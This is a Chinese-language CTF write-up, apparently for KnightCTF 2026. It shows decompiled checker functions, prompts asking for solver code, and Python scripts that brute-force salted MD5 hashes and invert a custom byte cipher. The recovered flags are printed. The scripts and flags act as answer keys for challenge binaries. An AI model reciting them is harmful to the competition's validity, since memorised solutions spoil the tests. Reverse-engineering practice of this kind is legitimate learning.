    while ( (unsigned int)v8 < v12 );
  }
  a3[32] = 0;
  return v14 - __readfsqword(0x28u);
}


_BOOL8 __fastcall sub_17A0(const char *a1)
{
  size_t v1; // rdx
  _BOOL8 result; // rax

  v1 = strlen(a1);
  result = 0LL;
  if ( v1 )
    return a1[v1 - 1] == 125;
  return result;
}

_BOOL8 __fastcall sub_1760(char *s1, char *s)
{
  size_t v2; // rax

  v2 = strlen(s);
  return strncmp(s1, s, v2) == 0;
}
```

现在我已经有了
```
.data.rel.ro:0000000000003CA0 off_3CA0        dq offset a781011edfb2127
.data.rel.ro:0000000000003CA0                                         ; DATA XREF: main+392↑o
.data.rel.ro:0000000000003CA0                                         ; "781011edfb2127ee5ff82b06bb1d2959"
.data.rel.ro:0000000000003CA8                 dq offset a4cf891e0ddadbc ; "4cf891e0ddadbcaae8e8c2dc8bb15ea0"
.data.rel.ro:0000000000003CB0                 dq offset aD06d0cbe140d0a ; "d06d0cbe140d0a1de7410b0b888f22b4"
.data.rel.ro:0000000000003CB8                 dq offset aD44c9a9b9f9d1c ; "d44c9a9b9f9d1c28d0904d6a2ee3e109"
.data.rel.ro:0000000000003CC0                 dq offset aE20ab37bee9d2a ; "e20ab37bee9d2a1f9ca3d914b0e98f09"
.data.rel.ro:0000000000003CC8                 dq offset aD0beea4ce1c121 ; "d0beea4ce1c12190db64d10a82b96ef8"
.data.rel.ro:0000000000003CD0                 dq offset aAc87da74d381d2 ; "ac87da74d381d253820bcf4e5f19fcea"
.data.rel.ro:0000000000003CD8                 dq offset aCe3f3a34a04ba5 ; "ce3f3a34a04ba5e5142f5db272b6cb1f"
.data.rel.ro:0000000000003CE0                 dq offset a13843aca227ef7 ; "13843aca227ef709694bbfe4e5a32203"
.data.rel.ro:0000000000003CE8                 dq offset aCa19a4c4eb435c ; "ca19a4c4eb435cb44d74c1e589e51a10"
.data.rel.ro:0000000000003CF0                 dq offset a19edec8e46bdf9 ; "19edec8e46bdf97e3018569c0a60baa3"
.data.rel.ro:0000000000003CF8                 dq offset a972e078458ce3c ; "972e078458ce3cb6e32f795ff4972718"
.data.rel.ro:0000000000003D00                 dq offset a071824f6039981 ; "071824f6039981e9c57725453e005beb"
.data.rel.ro:0000000000003D08                 dq offset a66cd6098426b0e ; "66cd6098426b0e69e30e7fa360310728"
.data.rel.ro:0000000000003D10                 dq offset aF78d152df5d277 ; "f78d152df5d277d0ab7d25fb7d1841f3"
.data.rel.ro:0000000000003D18                 dq offset aDba3a36431c4aa ; "dba3a36431c4aaf593566f7421abaa22"
.data.rel.ro:0000000000003D20                 dq offset a8820bbdad85ebe ; "8820bbdad85ebee06632c379231cfb6b"
.data.rel.ro:0000000000003D28                 dq offset a722bc7cde7d548 ; "722bc7cde7d548b81c5996519e1b0f0f"
.data.rel.ro:0000000000003D30                 dq offset aC2862c390c830e ; "c2862c390c830eb3c740ade576d64773"
.data.rel.ro:0000000000003D38                 dq offset a94da978fe383b3 ; "94da978fe383b341f9588f9bab246774"
.data.rel.ro:0000000000003D40                 dq offset aBea3bb724dbd17 ; "bea3bb724dbd1704cf45aea8e73c01e1"
.data.rel.ro:0000000000003D48                 dq offset aAde2289739760f ; "ade2289739760fa27fd4f7d4ffbc722d"
.data.rel.ro:0000000000003D50                 dq offset a3cd0538114fe41 ; "3cd0538114fe416b32cdd814e2ee57b3"
.data.rel.ro:0000000000003D58                 align 20h
```

请你写一个代码获得真实flag

</details>

```python
import hashlib

base = "KnightCTF_2026_s@lt"
hashes = [
    "781011edfb2127ee5ff82b06bb1d2959",
    "4cf891e0ddadbcaae8e8c2dc8bb15ea0",
    "d06d0cbe140d0a1de7410b0b888f22b4",
    "d44c9a9b9f9d1c28d0904d6a2ee3e109",
    "e20ab37bee9d2a1f9ca3d914b0e98f09",
    "d0beea4ce1c12190db64d10a82b96ef8",
    "ac87da74d381d253820bcf4e5f19fcea",
    "ce3f3a34a04ba5e5142f5db272b6cb1f",
    "13843aca227ef709694bbfe4e5a32203",
    "ca19a4c4eb435cb44d74c1e589e51a10",
    "19edec8e46bdf97e3018569c0a60baa3",
    "972e078458ce3cb6e32f795ff4972718",
    "071824f6039981e9c57725453e005beb",
    "66cd6098426b0e69e30e7fa360310728",
    "f78d152df5d277d0ab7d25fb7d1841f3",
    "dba3a36431c4aaf593566f7421abaa22",
    "8820bbdad85ebee06632c379231cfb6b",
    "722bc7cde7d548b81c5996519e1b0f0f",
    "c2862c390c830eb3c740ade576d64773",
    "94da978fe383b341f9588f9bab246774",
    "bea3bb724dbd1704cf45aea8e73c01e1",
    "ade2289739760fa27fd4f7d4ffbc722d",
    "3cd0538114fe416b32cdd814e2ee57b3"
]

flag_chars = []
for i in range(23):
    target_hash = hashes[i]
    found = False
    for c in range(256):  # 尝试所有可能的字节
        s = base + str(i) + chr(c)
        h = hashlib.md5(s.encode()).hexdigest()
        if h == target_hash:
            flag_chars.append(chr(c))
            found = True
            break
    if not found:
        flag_chars.append('?')

middle = ''.join(flag_chars)
flag = f"KCTF{{{middle}}}"
print(flag)
```

运行结果：`KCTF{_L0TS_oF_bRuTE_foRCE_:P}`


# [Rev] ReM3

<details>
<summary>Prompt</summary>

这段代码做了什么？
```
fgets(s, 256, stdin)
    *(__m128i *)v5 = _mm_load_si128((const __m128i *)s);
    *(__m128i *)&v5[13] = _mm_loadu_si128((const __m128i *)&s[13]);
    sub_14C0((__int64)v5);

        if ( (unsigned int)sub_1400(v5, &unk_2160/* DC 6B BB 4D FD 25 E4 7E  C3 26  */, &unk_2150/* F5 72 AB 96 FC 8D 55 10  93 C1 */, "齺F[~3儚/"/* FD 81 46 5B 7E 33 83 8F 2F 00 */) )
    {
      puts("Success! Real flag accepted.");
      return 0LL;
    }
```

已经知道：
```
char __fastcall sub_14C0(__int64 a1)
{
  int v2; // r8d
  int v3; // edi
  int v4; // esi
  __int64 i; // rdx
  int v6; // eax
  int v7; // ecx
  int v8; // eax

  v2 = 0;
  v3 = 0;
  v4 = -61;
  for ( i = 0LL; i != 29; ++i )
  {
    v6 = v3 + (0x2F910ED35CA71942uLL >> (8 * ((unsigned __int8)i & 7u)));
    v3 += 29;
    LOBYTE(v6) = __ROL1__(*(_BYTE *)(a1 + i) ^ v6, 0x6A124DE908B17733uLL >> ((8 * i + 16) & 0x38));
    v7 = v2 ^ (0x6A124DE908B17733uLL >> (8 * ((unsigned __int8)i & 7u)));
    v2 += 17;
    v8 = v7 ^ (v4 + v6);
    LOBYTE(v8) = __ROR1__(v8, v4);
    LOBYTE(v7) = (8 * i + 24) & 0x38;
    *(_BYTE *)(a1 + i) = v8;
    v4 += v8 + ((0x2F910ED35CA71942uLL >> v7) ^ 0xFFFFFFA5);
  }
  return v8;
}

__int64 __fastcall sub_1400(__int64 a1, __int64 a2, const void *a3, const void *a4)
{
  int v5; // eax
  unsigned int v6; // r9d

  if ( *(_QWORD *)a1 != *(_QWORD *)a2 || *(_WORD *)(a1 + 8) != *(_WORD *)(a2 + 8) )
    return 0LL;
  v5 = memcmp((const void *)(a1 + 10), a3, 0xAuLL);
  v6 = 0;
  if ( !v5 )
    return memcmp((const void *)(a1 + 20), a4, 9uLL) == 0;
  return v6;
}
```

写一段代码复原flag

</details>

```python
import struct

# 目标加密数据（合并三部分）
encrypted_data = bytes([
    # 第一部分 (10 bytes)
    0xDC, 0x6B, 0xBB, 0x4D, 0xFD, 0x25, 0xE4, 0x7E, 0xC3, 0x26,
    # 第二部分 (10 bytes)
    0xF5, 0x72, 0xAB, 0x96, 0xFC, 0x8D, 0x55, 0x10, 0x93, 0xC1,
    # 第三部分 (9 bytes)
    0xFD, 0x81, 0x46, 0x5B, 0x7E, 0x33, 0x83, 0x8F, 0x2F
])

# 常量
const1 = 0x2F910ED35CA71942
const2 = 0x6A124DE908B17733

def rol1(x, n):
    """8位循环左移"""
    n &= 7
    return ((x << n) & 0xFF) | (x >> (8 - n))

def ror1(x, n):
    """8位循环右移"""
    n &= 7
    return (x >> n) | ((x << (8 - n)) & 0xFF)

def decrypt(data):
    """逆向sub_14C0函数"""
    v2 = 0
    v3 = 0
    v4 = -61 & 0xFFFFFFFF  # 转换为无符号处理
    
    result = bytearray(29)
    
    # 因为加密过程需要正向计算v4，我们需要先模拟一遍加密过程来获取每个位置的v4值
    # 但这里我们直接从逆向角度思考
    
    # 预计算一些值
    precomputed = []
    for i in range(29):
        # 计算v2, v3
        v2_val = v2
        v3_val = v3
        
        # 计算移位值
        shift1 = (8 * i + 16) & 0x38
        shift2 = (8 * i + 24) & 0x38
        
        precomputed.append({
            'v2': v2_val,
            'v3': v3_val,
            'shift1': shift1,
            'shift2': shift2
        })
        
        v2 = (v2 + 17) & 0xFF
        v3 = (v3 + 29) & 0xFF
    
    # 逆向解密
    v4 = -61 & 0xFFFFFFFF
    flag = bytearray(29)
    
    for i in range(29):
        info = precomputed[i]
        
        # 获取加密后的字节
        enc_byte = data[i]
        
        # 逆向ROR操作
        # 在原始代码中：LOBYTE(v8) = __ROR1__(v8, v4)
        # 所以我们需要ROL来逆向
        v8 = rol1(enc_byte, v4 & 7)
        
        # 计算v7
        v7 = info['v2'] ^ ((const2 >> (8 * (i & 7))) & 0xFF)
        
        # 计算v6_encrypted
        v6_enc = v8 ^ v7
        
        # 调整v6_encrypted（需要考虑v4的影响）
        # 原始代码中：v8 = v7 ^ (v4 + v6)
        # 所以 v6_enc = (v4 + v6) & 0xFF
        # 因此真正的v6 = (v6_enc - v4) & 0xFF
        v6_real = (v6_enc - v4) & 0xFF
        
        # 逆向ROL操作
        # 原始代码中：LOBYTE(v6) = __ROL1__(input_byte ^ v6_temp, shift)
        # 其中v6_temp = v3 + (const1 >> (8 * (i & 7)))
        v6_temp = (info['v3'] + ((const1 >> (8 * (i & 7))) & 0xFF)) & 0xFF
        shift = (const2 >> info['shift1']) & 0xFF
        
        # 逆向ROL：input_byte ^ v6_temp = ror1(v6_real, shift)
        input_xor_v6temp = ror1(v6_real, shift & 7)
        
        # 得到原始输入字节
        flag[i] = input_xor_v6temp ^ v6_temp
        
        # 更新v4（与加密过程一致）
        v4 = (v4 + enc_byte + (((const1 >> info['shift2']) & 0xFF) ^ 0xA5)) & 0xFFFFFFFF
    
    return flag

# 尝试解密
try:
    flag_bytes = decrypt(encrypted_data)
    flag_str = flag_bytes.decode('utf-8', errors='ignore')
    
    print("解密后的字节:", flag_bytes.hex())
    print("尝试解码为字符串:", flag_str)
    
    # 尝试不同的编码
    for encoding in ['utf-8', 'latin-1', 'ascii']:
        try:
            print(f"{encoding}: {flag_bytes.decode(encoding)}")
        except:
            pass
            
except Exception as e:
    print(f"解密出错: {e}")
```

运行结果：`KCTF{w3Lc0m3_T0_tHE_r3_w0rLD}`



# [Networking] Exploitation

还是读响应包。这个直接读就行了。